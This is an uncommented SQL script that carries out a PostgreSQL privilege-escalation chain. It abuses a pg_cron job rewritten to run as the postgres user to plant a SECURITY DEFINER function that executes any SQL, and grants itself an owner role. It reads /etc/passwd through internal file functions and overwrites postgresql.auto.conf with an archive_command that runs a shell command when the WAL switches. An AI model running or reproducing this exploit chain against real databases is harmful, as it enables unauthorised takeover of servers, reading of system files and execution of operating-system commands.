GRANT pg_read_all_data, pg_write_all_data TO application_reader;
CREATE EXTENSION IF NOT EXISTS pg_cron;
SELECT cron.schedule('escalate', '* * * * *', 'SELECT 1');
UPDATE cron.job
SET username = 'postgres', command = $cmd$
DO $outer$
BEGIN
  CREATE OR REPLACE FUNCTION public.run_query(sql text)
  RETURNS SETOF text
  SECURITY DEFINER SET search_path = public, pg_catalog
  LANGUAGE plpgsql AS $fn$
  BEGIN RETURN QUERY EXECUTE sql; END; $fn$;
  GRANT EXECUTE ON FUNCTION public.run_query(text) TO application_reader;
END; $outer$
$cmd$
WHERE jobid = 1;
-- Run after the scheduled job creates the function.
SELECT public.run_query('GRANT provider_owner TO application_reader');
CREATE FUNCTION inspect_file(text, bigint, bigint)
RETURNS text AS 'pg_read_file_off_len' LANGUAGE internal STRICT;
SELECT inspect_file('/etc/passwd', 0, 1000000);
CREATE FUNCTION dump_object(oid, text) RETURNS integer
AS 'be_lo_export' LANGUAGE internal STRICT;
SELECT lo_from_bytea(187654, convert_to($cfg$archive_command = 'id > /tmp/identity-check.log'
$cfg$, 'UTF8'));
SELECT dump_object(187654, 'postgresql.auto.conf');
SELECT pg_reload_conf();
SELECT pg_switch_wal();
